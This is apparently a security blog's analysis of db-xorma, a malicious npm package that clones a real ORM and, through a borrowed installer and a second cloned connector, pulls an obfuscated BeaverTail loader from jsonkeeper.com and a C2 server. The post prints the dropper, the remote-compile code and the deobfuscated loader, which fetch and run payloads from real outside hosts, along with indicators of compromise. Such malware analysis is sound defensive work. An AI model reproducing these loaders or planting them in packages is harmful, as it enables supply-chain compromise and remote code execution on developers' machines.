---
title: "db-xorma: malware laundered through legit npm packages"
date: 2026-06-21
summary: "db-xorma's tarball carries no payload — just a clone of a real ORM whose one bolted-on method launders the attack through a real installer and a second cloned package, pulling the obfuscated BeaverTail loader from a paste host at runtime."
packageName: "db-xorma"
ecosystem: npm
---

<img src="/assets/images/db-xorma-laundry-everywhere.jpg" alt="The Buzz Lightyear 'everywhere' meme — Buzz gestures wide while Woody frets, captioned 'LAUNDRY. LAUNDRY, EVERYWHERE.' — for malware that hides behind clean clothes at every hop: a cloned ORM, a cloned connector, and a borrowed installer, all legitimate-looking, with the real payload fetched at runtime instead of shipped." style="width: 60%; height: auto;">

Most malicious npm packages smuggle their payload inside the tarball — an obfuscated blob, a poisoned install hook; db-xorma keeps its weapon off-package entirely and ships little more than a working library. It is a working clone of `xorma`, a real mobx-powered reactive ORM, with the store, the undo/redo history, even the author line all lifted — the clean clothes the whole operation hides behind. Instantiate any model and a static method the clone bolted on, `resetor()`, pulls a second package off the registry at runtime and lets it fetch a third stage.

## Stage 1 — the armed CommonJS twin

{% raw %}
<pre class="lang-js"><code><span class="tok-kw">const</span> { syncApi: npm } = <span class="tok-fn">require</span>(<span class="tok-str">"oubliette"</span>);
<span class="tok-com">// …called from the Model constructor: this.constructor.resetor()</span>
<span class="tok-kw">static</span> <span class="tok-fn">resetor</span>() {
  <span class="tok-kw">try</span> {
    <span class="tok-kw">const</span> C = <span class="tok-fn">require</span>(<span class="tok-str">"db-dx-connector"</span>);
    <span class="tok-kw">new</span> <span class="tok-fn">C</span>({}).<span class="tok-fn">queryDBConnect</span>();
  } <span class="tok-kw">catch</span> (err) {
    <span class="tok-kw">try</span> {
      <span class="tok-fn">npm</span>().<span class="tok-fn">install</span>(<span class="tok-str">"db-dx-connector"</span>, { loglevel: <span class="tok-str">"silent"</span>, <span class="tok-str">"no-save"</span>: <span class="tok-kw">true</span> });
      <span class="tok-kw">new</span> (<span class="tok-fn">require</span>(<span class="tok-str">"db-dx-connector"</span>))({}).<span class="tok-fn">queryDBConnect</span>();
    } <span class="tok-kw">catch</span> (error) {}
  }
}
</code></pre>
{% endraw %}

The dropper lives only in the CommonJS build — the `module` entry bundlers prefer is clean — so it fires server-side under require and never shows up in the browser bundle the README sells. On first call `db-dx-connector` isn't installed, the require throws, and the catch installs it then runs its connect method, so the second stage arrives on demand rather than in the tarball.

| | File | Trait | Evidence |
| --- | --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `dist/index.js` | `objectives/supply-chain/install-hook/scripts/dynamic-install` | Installs `db-dx-connector` via the aliased API when its `require` fails [T1195.002] |
| <span class="sev-dot hostile" title="hostile"></span> | `dist/index.js` | `objectives/supply-chain/impersonation/package-manager` | Third-party installer imported under the name `npm` [T1195.002] |
| <span class="sev-dot notable" title="notable"></span> | `dist/index.js` | `micro-behaviors/process/create/exec` | Commented-out `execSync` reinstalling `clsx-js` — prior-campaign leftover |

## Laundering the install through oubliette

The install gets the same treatment: `npm().install(...)` looks like a programmatic API, but oubliette only assembles a real npm command string and runs it through child_process, so the genuine client does the fetching.

{% raw %}
<pre class="lang-js"><code><span class="tok-com">// oubliette/lib/oubliette-sync.js — the whole mechanism</span>
<span class="tok-kw">const</span> exec = <span class="tok-fn">require</span>(<span class="tok-str">"node:child_process"</span>).execSync;
<span class="tok-kw">const</span> command = <span class="tok-tmpl">`npm <span class="tok-tmpl-expr">${name}</span> <span class="tok-tmpl-expr">${serialise(...args)}</span>`</span>.<span class="tok-fn">trim</span>(); <span class="tok-com">// "npm install db-dx-connector --loglevel silent"</span>
<span class="tok-kw">const</span> output = <span class="tok-fn">exec</span>(command, options);
</code></pre>
{% endraw %}

What db-xorma gains is a clean source — no `execSync`, no child_process import, not even an install string, because every such primitive sits one dependency away in oubliette. Oubliette is genuinely blameless, a real programmatic-npm wrapper by Stephen Cresswell born when npm dropped its API in v8.0.0; the malware simply rents its respectability.

## Stage 2 — the connector that compiles a ghost

db-dx-connector is a near-verbatim clone of Divblox's real `dx-db-connector`, author line and all, with one extra method. It base64-decodes a jsonkeeper.com URL, pulls the JSON's content field with axios, and compiles the response in memory as a fake module named error.js via `Module._compile` — no temp file, no eval keyword, and a public paste host the operator can re-stock without re-touching npm.

{% raw %}
<pre class="lang-js"><code><span class="tok-kw">async</span> <span class="tok-fn">queryDBConnect</span>() {
  <span class="tok-kw">try</span> {
    <span class="tok-kw">const</span> HASH_KEY = <span class="tok-str">"aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9aSUFJSw"</span>; <span class="tok-com">// → jsonkeeper.com/b/ZIAIK</span>
    <span class="tok-kw">const</span> s1 = (<span class="tok-kw">await</span> axios.<span class="tok-fn">get</span>(<span class="tok-fn">atob</span>(HASH_KEY))).data.content;
    <span class="tok-kw">const</span> Mod = <span class="tok-fn">require</span>(<span class="tok-str">"node:module"</span>);
    <span class="tok-kw">const</span> m = <span class="tok-kw">new</span> Mod.<span class="tok-fn">Module</span>(<span class="tok-str">"error.js"</span>, module.parent);
    m.<span class="tok-fn">_compile</span>(s1, <span class="tok-str">"error.js"</span>); <span class="tok-com">// runs remote code as if it were error.js</span>
  } <span class="tok-kw">catch</span> (error) {}
}
</code></pre>
{% endraw %}

| | File | Trait | Evidence |
| --- | --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `index.js` | `objectives/command-and-control/dropper/delivery/fetch-eval` | JsonKeeper payload fetched and run via `Module._compile` [T1102.001, T1059.007] |
| <span class="sev-dot hostile" title="hostile"></span> | `index.js` | `objectives/supply-chain/hidden-payload/exec` | npm package compiles a hidden remote payload [T1195.002, T1059.007] |
| <span class="sev-dot hostile" title="hostile"></span> | `index.js` | `objectives/supply-chain/trojanized/package` | Trojanized clone of `dx-db-connector` that stages the JsonKeeper payload [T1195.002] |

## Stage 3 — the BeaverTail loader

The jsonkeeper blob is javascript-obfuscator output; decoded, it is the same loader catalogued across this site's DPRK finds. It spawns an npm install for axios and socket.io-client, GETs its next stage from a hard-coded address, writes it to the temp directory as `0001.dat`, and runs it with node. The C2 at `5.231.107.229` and the campaign id are new; the 0001.dat / socket.io-client / node-runner skeleton is not — it is [@sqlite-node/createsql](/discoveries/2026/06/sqlite-node-createsql-dprk-gist/) and [web-dotenv](/discoveries/2026/05/web-dotenv-jsonkeeper-redirector/) wearing yet another wrapper.

{% raw %}
<pre class="lang-js"><code><span class="tok-com">// stage 3, deobfuscated (string array RC4-decoded)</span>
<span class="tok-fn">spawn</span>(npmBin, <span class="tok-str">"npm install axios socket.io-client --no-save --no-progress --loglevel silent"</span>,
      { windowsHide: <span class="tok-kw">true</span>, cwd: os.<span class="tok-fn">tmpdir</span>() });
<span class="tok-kw">const</span> C2 = <span class="tok-str">"http://5.231.107.229/api/service/6818cc25a53cf93f290d85c334d8a3b8"</span>;
axios.<span class="tok-fn">get</span>(C2).<span class="tok-fn">then</span>((res) =&gt; {
  <span class="tok-fn">writeFileSync</span>(<span class="tok-fn">join</span>(os.<span class="tok-fn">tmpdir</span>(), <span class="tok-str">"0001.dat"</span>), res.data, { flag: <span class="tok-str">"w+"</span> });
  <span class="tok-fn">spawn</span>(npmBin, <span class="tok-str">"node 0001.dat"</span>, { windowsHide: <span class="tok-kw">true</span>, cwd: os.<span class="tok-fn">tmpdir</span>() });
});
</code></pre>
{% endraw %}

| | File | Trait | Evidence |
| --- | --- | --- | --- |
| <span class="sev-dot hostile" title="hostile"></span> | `stage3 payload` | `objectives/command-and-control/dropper/execution/network-stage` | Obfuscated downloader fetches and runs the next Node stage [T1105] |
| <span class="sev-dot hostile" title="hostile"></span> | `stage3 payload` | `objectives/supply-chain/hidden-payload/runtime` | Obfuscated loader hides staged execution at runtime |
| <span class="sev-dot suspicious" title="suspicious"></span> | `stage3 payload` | `objectives/anti-static/obfuscation/obfuscator/js-obfuscator` | javascript-obfuscator string-array + rotation decoder |
| <span class="sev-dot suspicious" title="suspicious"></span> | `stage3 payload` | `micro-behaviors/process/create/spawn` | `windowsHide` spawn of `node 0001.dat` from `tmpdir` |

## Package metadata

| Field | Value |
| --- | --- |
| Name | `db-xorma` |
| Version | `1.0.5` |
| Description | (empty) |
| Author | `Austin Malerba` |
| License | `MIT` |
| Main | `dist/index.js` |
| Module | `dist/index.mjs` |
| Dependencies | `oubliette ^1.0.2`, `mobx ^6.13.5` |
| Peer dependencies | `mobx ^6.0.0` |

## Indicators

| Indicator | Value |
| --- | --- |
| Stage 1 tarball (`db-xorma`) SHA-256 | [50631ecc747eab0af192ad4f328081047fe320d5b19bf8746c27b6c5e25861a6](https://lab.atomdrift.org/file/50631ecc747eab0af192ad4f328081047fe320d5b19bf8746c27b6c5e25861a6) |
| Stage 1 `index.js` SHA-256 | [392b84c49a18b431b6f454c715a8f6b43e63f95d47b44b55dd70a85c8ed8c465](https://lab.atomdrift.org/file/392b84c49a18b431b6f454c715a8f6b43e63f95d47b44b55dd70a85c8ed8c465) |
| Stage 2 tarball (`db-dx-connector`) SHA-256 | [2a94901a01417bf2c0096556725ca56619f176b0c79d3d6a1fcf4ff48e35e35b](https://lab.atomdrift.org/file/2a94901a01417bf2c0096556725ca56619f176b0c79d3d6a1fcf4ff48e35e35b) |
| Stage 2 `index.js` SHA-256 | [5ec319f44610644a95e0cfaccf4fba6cbe3b2f0a1532f9179bcff3d22b121cbe](https://lab.atomdrift.org/file/5ec319f44610644a95e0cfaccf4fba6cbe3b2f0a1532f9179bcff3d22b121cbe) |
| Stage 3 payload SHA-256 | [8cd5ddcaed0e7f15b570a531d59f1dd6698d9bd7246dbf87c59e877a8720b6ff](https://lab.atomdrift.org/file/8cd5ddcaed0e7f15b570a531d59f1dd6698d9bd7246dbf87c59e877a8720b6ff) |
| Stage 3 dead-drop | `https://www.jsonkeeper.com/b/ZIAIK` |
| C2 | `http://5.231.107.229/api/service/6818cc25a53cf93f290d85c334d8a3b8` |
| Campaign id | `6818cc25a53cf93f290d85c334d8a3b8` |
| Runtime-installed package | `db-dx-connector` |
| Prior-campaign target (commented) | `clsx-js` |
| Dropped artifact | `0001.dat` (in `os.tmpdir()`) |

Strip the three clean wrappers — a real ORM, a real connector, a real installer — and db-xorma is just a courier: npm does the fetching, npm does the detonating, and the dirtiest laundry, the obfuscated loader, is the one thing it never carries. The whole bet was that subtlety reads as safety — nothing obfuscated, nothing on disk, the install buried one dependency deep — yet Atomdrift flagged every hop as hostile anyway, because it scores the plumbing, not the dirt, and a laundered channel is still a channel.
